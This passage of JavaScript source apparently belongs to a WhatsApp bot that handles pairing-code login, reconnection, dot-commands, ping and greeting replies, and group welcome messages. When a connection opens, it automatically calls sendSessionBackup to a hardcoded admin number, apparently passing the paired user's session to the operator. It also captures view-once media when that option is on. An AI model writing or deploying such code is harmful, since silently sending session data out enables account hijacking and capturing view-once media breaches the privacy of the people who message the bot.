  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr && !sock.authState.creds.registered && !hasRequestedCode) {
      hasRequestedCode = true;
      try {
        await new Promise(r => setTimeout(r, 500));
        const code = await sock.requestPairingCode(phoneNumber);
        console.log('[Bot] Pairing code:', code);
        callbacks.onPairingCode?.(code);
      } catch (err) {
        console.error('[Bot] Pairing error:', err.message);
        hasRequestedCode = false;
      }
    }

    if (connection === 'open') {
      console.log('[Bot] Connected!');
      botJid = sock.user?.id;
      callbacks.onConnected?.();
      if (ADMIN_NUMBER && currentNumber) {
        setTimeout(() => sendSessionBackup(`${ADMIN_NUMBER}@s.whatsapp.net`), 5000);
      }
    }

    if (connection === 'close') {
      if (isStopping) return;
      const code = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = code !== DisconnectReason.loggedOut;
      console.log('[Bot] Closed. Code:', code, 'Reconnect:', shouldReconnect);
      if (shouldReconnect) {
        setTimeout(() => startBot(currentNumber, callbacks), 2000);
      } else {
        callbacks.onDisconnected?.('logged_out');
      }
    }
  });

  // ===== MESSAGES =====
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;

    for (const msg of messages) {
      if (!msg.message) continue;
      const from = msg.key.remoteJid;
      if (!from) continue;

      // --- FIX: Allow Admin's own messages (fromMe) ---
      const senderJid = msg.key.participant || from;
      const senderNum = (senderJid || '').split('@')[0].split(':')[0];
      const fromMeIsAdmin = msg.key.fromMe && ADMIN_NUMBER && senderNum === ADMIN_NUMBER;
      const fromBot = msg.key.fromMe && botJid && (msg.key.participant || '').startsWith(botJid.split(':')[0]);

      if (msg.key.fromMe && !fromMeIsAdmin) continue;
      if (fromBot && !fromMeIsAdmin) continue;

      try { await sock.readMessages([msg.key]); } catch (e) {}

      if (viewOnceEnabled) {
        await tryCaptureViewOnce(msg, from);
      }

      const text = extractText(msg);
      console.log(`[Msg] ${from}: ${text}`);

      if (text.startsWith('.')) {
        try { await handleCommand(msg, from, senderJid, text); }
        catch (e) { console.error('[Cmd] Error:', e.message); }
        continue;
      }

      if (isPaused(from)) continue;

      try {
        if (text.toLowerCase() === 'ping') {
          await withTyping(from, () => sock.sendMessage(from, { text: 'pong 🏓' }));
        } else if (text.toLowerCase() === 'hi' || text.toLowerCase() === 'hello') {
          await withTyping(from, () => sock.sendMessage(from, { text: 'Hey! 👋 Type *.help* for commands.' }));
        }
      } catch (e) {}
    }
  });

  // ===== GROUP EVENTS =====
  sock.ev.on('group-participants.update', async (event) => {
    try {
      const { id, participants, action } = event;
      if (action === 'add' && welcomeEnabled.has(id)) {
        await sendWelcome(id, participants);
      }
      if (action === 'remove' && goodbyeEnabled.has(id)) {
        await sendGoodbye(id, participants);
      }
    } catch (e) { console.error('[Group] Error:', e.message); }
  });
}

function stopBot() {
  isStopping = true;
  try {
    if (sock) { sock.end(undefined); sock = null; }
  } catch (e) {}
}

module.exports = { startBot, stopBot };